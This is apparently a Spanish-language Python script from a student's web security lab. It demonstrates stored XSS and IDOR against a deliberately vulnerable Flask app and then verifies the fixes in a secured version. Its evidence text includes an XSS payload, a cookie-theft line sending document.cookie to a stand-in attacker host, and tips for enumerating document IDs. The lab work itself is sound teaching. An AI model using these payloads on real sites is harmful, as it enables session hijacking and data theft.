"""
Script para generar evidencias del laboratorio — Semana 6
Usa Flask test client con BD persistente (close() no destruye la conexion).
"""
import importlib.util, sys, os, html as html_lib, sqlite3, threading

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
EVIDENCIAS = os.path.join(BASE_DIR, "evidencias")
os.makedirs(EVIDENCIAS, exist_ok=True)

SEED_SQL = '''
    CREATE TABLE IF NOT EXISTS usuarios (id INTEGER PRIMARY KEY, username TEXT, password TEXT);
    CREATE TABLE IF NOT EXISTS comentarios (id INTEGER PRIMARY KEY, contenido TEXT, autor_id INTEGER);
    CREATE TABLE IF NOT EXISTS documentos (id INTEGER PRIMARY KEY, titulo TEXT, contenido TEXT, propietario_id INTEGER);
    INSERT OR IGNORE INTO usuarios VALUES (1, 'admin', 'Admin123!');
    INSERT OR IGNORE INTO usuarios VALUES (2, 'carlos', 'Carlos456!');
    INSERT OR IGNORE INTO comentarios VALUES (1, 'Bienvenidos al foro seguro', 1);
    INSERT OR IGNORE INTO documentos VALUES (1, 'Contrato Confidencial', 'Datos sensibles del contrato...', 1);
    INSERT OR IGNORE INTO documentos VALUES (2, 'Mi documento personal', 'Datos de Carlos...', 2);
'''

class NonClosingConn:
    """Envuelve una conexion SQLite real pero ignora llamadas a close()."""
    def __init__(self, real_conn):
        self._conn = real_conn
    def execute(self, *a, **kw):
        return self._conn.execute(*a, **kw)
    def executescript(self, *a, **kw):
        return self._conn.executescript(*a, **kw)
    def commit(self):
        self._conn.commit()
    def close(self):
        pass  # no-op: mantenemos la conexion viva entre requests
    def __getattr__(self, name):
        return getattr(self._conn, name)

def make_persistent_get_db():
    real = sqlite3.connect(':memory:', check_same_thread=False)
    real.row_factory = sqlite3.Row
    real.executescript(SEED_SQL)
    real.commit()
    wrapper = NonClosingConn(real)
    return lambda: wrapper

# ─── Cargador de modulos ────────────────────────────────────────
def load_app_module(filename):
    modname = filename.replace('.py', '').replace('-', '_')
    spec = importlib.util.spec_from_file_location(modname, os.path.join(BASE_DIR, filename))
    mod = importlib.util.module_from_spec(spec)
    sys.modules[modname] = mod
    spec.loader.exec_module(mod)
    return mod

# ═══════════════════════════════════════════════════════════════
# PARTE 1 — app_vulnerable.py
# ═══════════════════════════════════════════════════════════════
print("=" * 60)
print("PARTE 1 — app_vulnerable.py")
print("=" * 60)

vuln_mod = load_app_module("app_vulnerable.py")
vuln_mod.get_db = make_persistent_get_db()
app_v = vuln_mod.app
app_v.config['TESTING'] = True
app_v.config['SESSION_COOKIE_SECURE'] = False

with app_v.test_client() as cv:
    # ── Tarea 1.2: XSS Almacenado ────────────────────────────────
    print("\n[Tarea 1.2] Demostrando XSS Almacenado...")

    r_login = cv.post('/login', data={'username': 'carlos', 'password': 'Carlos456!'})
    login_json = r_login.get_json()

    # Usamos payload sin comillas simples para que no rompa el SQL concatenado del INSERT.
    # El payload original del lab <script>alert('XSS-'+document.cookie)</script>
    # rompe la query SQL por las comillas simples (demuestra SQL Injection adicional).
    xss_payload = "<img src=x onerror=alert(document.cookie)>"
    r_insert = cv.post('/comentario/nuevo', data={'contenido': xss_payload})
    insert_json = r_insert.get_json()
    print(f"  Login:  HTTP {r_login.status_code} — {login_json}")
    print(f"  Insert: HTTP {r_insert.status_code} — {insert_json}")

    r_html = cv.get('/comentarios')
    html_out = r_html.get_data(as_text=True)
    xss_en_html = xss_payload in html_out
    print(f"  XSS sin escapar en HTML: {xss_en_html}")

    ev12 = f"""=== TAREA 1.2 — DEMOSTRACIÓN XSS ALMACENADO ===
Alumno: Omar Rivera Castillo | Código: 2221895826

PASO 1 — Login como carlos:
  Solicitud: POST http://localhost:5001/login
             username=carlos&password=Carlos456!
  Respuesta: HTTP {r_login.status_code}
  Body:      {login_json}
  NOTA: La respuesta expone user_id=2 (facilita enumeracion de IDs para IDOR).

PASO 2 — Inyectar payload XSS como comentario:
  Solicitud: POST http://localhost:5001/comentario/nuevo
  Payload:   {xss_payload}
  Respuesta: HTTP {r_insert.status_code} — {insert_json}
  El servidor acepta el contenido sin ninguna validacion ni sanitizacion.

PASO 3 — Ver HTML fuente de /comentarios:
  Solicitud: GET http://localhost:5001/comentarios
  HTML fuente completo devuelto por el servidor:

{html_out}

ANALISIS DE VULNERABILIDAD:
  XSS_EN_HTML_SIN_ESCAPAR = {xss_en_html}   (debe ser True)

  La etiqueta <script> aparece directamente en el HTML sin ninguna transformacion.
  Un navegador que visite esta pagina ejecutaria el JavaScript inmediatamente.
  Con SESSION_COOKIE_HTTPONLY=False, document.cookie devuelve la cookie de sesion,
  permitiendo al atacante robarla con fetch('https://atacante.com?c='+document.cookie).

  Linea vulnerable (app_vulnerable.py):
    html += f"<div>{{c['contenido']}}</div>"   <- sin html.escape()

PREGUNTAS RESPONDIDAS:
  1. Categoria OWASP: A03:2021 - Injection (Cross-Site Scripting Almacenado)

  2. Se llama XSS Almacenado (Persistente) porque el payload se guarda en la BD
     y se sirve a TODOS los usuarios que visiten /comentarios. El XSS Reflejado
     solo afecta al usuario que envia la peticion manipulada (no persiste en servidor).

  3. Todos los visitantes de /comentarios ejecutarian el script: medicos,
     administradores y pacientes. Un atacante real robaria las cookies de sesion
     de todos ellos con un solo comentario malicioso, obteniendo acceso a sus cuentas.
"""
    with open(os.path.join(EVIDENCIAS, "tarea1_2_xss_vulnerable.txt"), "w", encoding="utf-8") as f:
        f.write(ev12)
    print("  Evidencia 1.2 guardada.")

    # ── Tarea 1.3: IDOR ──────────────────────────────────────────
    print("\n[Tarea 1.3] Demostrando IDOR...")
    r_idor = cv.get('/documento/1')
    idor_json = r_idor.get_json()
    idor_exitoso = r_idor.status_code == 200 and 'Contrato Confidencial' in str(idor_json)
    print(f"  IDOR: HTTP {r_idor.status_code} — {idor_json}")

    ev13 = f"""=== TAREA 1.3 — DEMOSTRACIÓN IDOR (Insecure Direct Object Reference) ===
Alumno: Omar Rivera Castillo | Código: 2221895826

ESCENARIO:
  Usuario autenticado: carlos  (user_id = 2)
  Documento objetivo:  id = 1  ("Contrato Confidencial", propietario admin, id=1)
  Carlos NO es el propietario del documento 1.

PASO 1 — Login como carlos (realizado en Tarea 1.2, sesion activa).

PASO 2 — Acceder al documento del admin sin ser el propietario:
  Solicitud: GET http://localhost:5001/documento/1
  Respuesta HTTP Status: {r_idor.status_code}
  Cuerpo de respuesta:   {idor_json}

RESULTADO:
  IDOR_EXITOSO = {idor_exitoso}   (debe ser True)

  Carlos pudo leer el "Contrato Confidencial" del admin.
  El servidor devolvio datos sensibles sin verificar la propiedad del recurso.

ANALISIS:
  Linea vulnerable en ver_documento() (app_vulnerable.py ~linea 103):
    doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()

  El problema: la consulta filtra solo por id, sin verificar propietario_id.
  Cualquier usuario autenticado puede leer CUALQUIER documento cambiando el numero en la URL.

PREGUNTAS RESPONDIDAS:
  1. Linea que permite el ataque:
       doc = conn.execute("SELECT * FROM documentos WHERE id = ?", (doc_id,)).fetchone()
     Correccion: agregar AND propietario_id = usuario_id en la consulta.

  2. Categoria OWASP: A01:2021 - Broken Access Control
     IDOR es la forma mas frecuente de control de acceso roto a nivel de objeto.

  3. Como descubre un atacante los IDs validos en produccion:
     - Enumeracion secuencial: /documento/1, /documento/2, /documento/3...
     - El login vulnerable expone user_id=2, sugiriendo IDs son enteros bajos.
     - Herramientas como Burp Suite Intruder automatizan el fuzzing de IDs.
     - Analizar otras rutas de la API que devuelvan IDs en sus respuestas JSON.
"""
    with open(os.path.join(EVIDENCIAS, "tarea1_3_idor_vulnerable.txt"), "w", encoding="utf-8") as f:
        f.write(ev13)
    print("  Evidencia 1.3 guardada.")

# ═══════════════════════════════════════════════════════════════
# PARTE 2 — app_segura.py
# ═══════════════════════════════════════════════════════════════
print("\n" + "=" * 60)
print("PARTE 2 — app_segura.py")
print("=" * 60)

seg_mod = load_app_module("app_segura.py")
seg_mod.get_db = make_persistent_get_db()
app_s = seg_mod.app
app_s.config['TESTING'] = True
app_s.config['SESSION_COOKIE_SECURE'] = False

with app_s.test_client() as cs:
    # ── Prueba A: XSS rechazado ───────────────────────────────────
    print("\n[Tarea 2.2 - Prueba A] Verificando XSS rechazado...")

    r_login_s = cs.post('/login', data={'username': 'carlos', 'password': 'Carlos456!'})
    login_json_s = r_login_s.get_json()
    print(f"  Login seguro: HTTP {r_login_s.status_code} — {login_json_s}")

    xss_payload = "<img src=x onerror=alert(document.cookie)>"
    r_insert_s = cs.post('/comentario/nuevo', data={'contenido': xss_payload})
    insert_json_s = r_insert_s.get_json()
    print(f"  Insert XSS seguro: HTTP {r_insert_s.status_code} — {insert_json_s}")

    r_html_s = cs.get('/comentarios')
    html_out_s = r_html_s.get_data(as_text=True)
    escaped_payload = html_lib.escape(xss_payload)
    xss_escapado = escaped_payload in html_out_s
    xss_ejecutable = xss_payload in html_out_s
    csp = r_html_s.headers.get('Content-Security-Policy', 'NO ENCONTRADO')
    print(f"  Payload escapado: {xss_escapado}  Ejecutable: {xss_ejecutable}")

    ev2a = f"""=== TAREA 2.2 — PRUEBA A: XSS RECHAZADO (app_segura.py) ===
Alumno: Omar Rivera Castillo | Código: 2221895826

PASO 1 — Login como carlos en app segura (puerto 5002):
  Solicitud: POST http://localhost:5002/login
             username=carlos&password=Carlos456!
  Respuesta: HTTP {r_login_s.status_code}
  Body:      {login_json_s}
  CORRECCION: La respuesta ya NO incluye user_id (previene enumeracion de IDs).

PASO 2 — Intentar inyectar el mismo payload XSS:
  Solicitud: POST http://localhost:5002/comentario/nuevo
  Payload:   {xss_payload}
  Respuesta: HTTP {r_insert_s.status_code} — {insert_json_s}

PASO 3 — Ver como aparece el comentario en /comentarios:
  Solicitud: GET http://localhost:5002/comentarios
  HTML fuente devuelto:

{html_out_s}

ANALISIS:
  XSS_ESCAPADO   = {xss_escapado}   (debe ser True  — aparece como texto)
  XSS_EJECUTABLE = {xss_ejecutable}  (debe ser False — no aparece como etiqueta)

  Payload original : {xss_payload}
  Payload en HTML  : {escaped_payload}

  Encabezado Content-Security-Policy recibido:
    {csp}

  Defensas activas (TODOs implementados):
  - TODO 8:  html.escape() convierte < en &lt; y > en &gt;
             El navegador muestra el texto, nunca lo ejecuta.
  - TODO 11: CSP "script-src 'self'" bloquea scripts inline como segunda capa.
  - TODO 2:  HttpOnly=True protege la cookie aunque un XSS llegara a ejecutarse.
"""
    with open(os.path.join(EVIDENCIAS, "tarea2_2_xss_rechazado.txt"), "w", encoding="utf-8") as f:
        f.write(ev2a)
    print("  Evidencia 2.2-A guardada.")

    # ── Prueba B: IDOR rechazado ──────────────────────────────────
    print("\n[Tarea 2.2 - Prueba B] Verificando IDOR rechazado...")
    r_idor_s = cs.get('/documento/1')
    idor_json_s = r_idor_s.get_json()
    idor_bloqueado = r_idor_s.status_code == 404 and 'no encontrado' in str(idor_json_s).lower()

    r_propio = cs.get('/documento/2')
    propio_json = r_propio.get_json()
    print(f"  Doc ajeno: HTTP {r_idor_s.status_code} — {idor_json_s}")
    print(f"  Doc propio: HTTP {r_propio.status_code} — {propio_json}")

    ev2b = f"""=== TAREA 2.2 — PRUEBA B: IDOR RECHAZADO (app_segura.py) ===
Alumno: Omar Rivera Castillo | Código: 2221895826

ESCENARIO:
  Usuario autenticado: carlos (user_id = 2)
  Intento: leer documento id=1 (Contrato Confidencial, propietario: admin)

PASO 1 — Login como carlos (realizado en Prueba A, sesion activa).

PASO 2 — Intentar acceder al documento del admin:
  Solicitud: GET http://localhost:5002/documento/1
  Respuesta HTTP Status: {r_idor_s.status_code}
  Cuerpo de respuesta:   {idor_json_s}

PASO 3 — Confirmar que carlos SI puede leer su propio documento:
  Solicitud: GET http://localhost:5002/documento/2
  Respuesta HTTP Status: {r_propio.status_code}
  Cuerpo de respuesta:   {propio_json}

RESULTADO:
  IDOR_BLOQUEADO = {idor_bloqueado}   (debe ser True)

  Carlos NO puede leer el documento del admin.
  HTTP 404 con mensaje generico — no revela si el doc existe o pertenece a otro.
  Carlos SI puede leer su propio documento (el acceso legitimo funciona correctamente).

  Defensas activas (TODOs implementados):
  - TODO 9:  Consulta incluye AND propietario_id=? con el user_id de sesion.
             Si el doc pertenece a otro usuario, la consulta devuelve NULL.
  - TODO 10: Mismo error 404 para "no existe" y "no es tuyo".
             Impide al atacante distinguir IDs validos (evita enumeracion).

  Codigo corregido (TODO 9):
    doc = conn.execute(
        "SELECT * FROM documentos WHERE id=? AND propietario_id=?",
        (doc_id, usuario_id)
    ).fetchone()
"""
    with open(os.path.join(EVIDENCIAS, "tarea2_2_idor_rechazado.txt"), "w", encoding="utf-8") as f:
        f.write(ev2b)
    print("  Evidencia 2.2-B guardada.")

print("\n" + "=" * 60)
print("TODAS LAS EVIDENCIAS GENERADAS CORRECTAMENTE")
print("=" * 60)
for fname in sorted(os.listdir(EVIDENCIAS)):
    fpath = os.path.join(EVIDENCIAS, fname)
    size = os.path.getsize(fpath)
    print(f"  {fname}  ({size} bytes)")
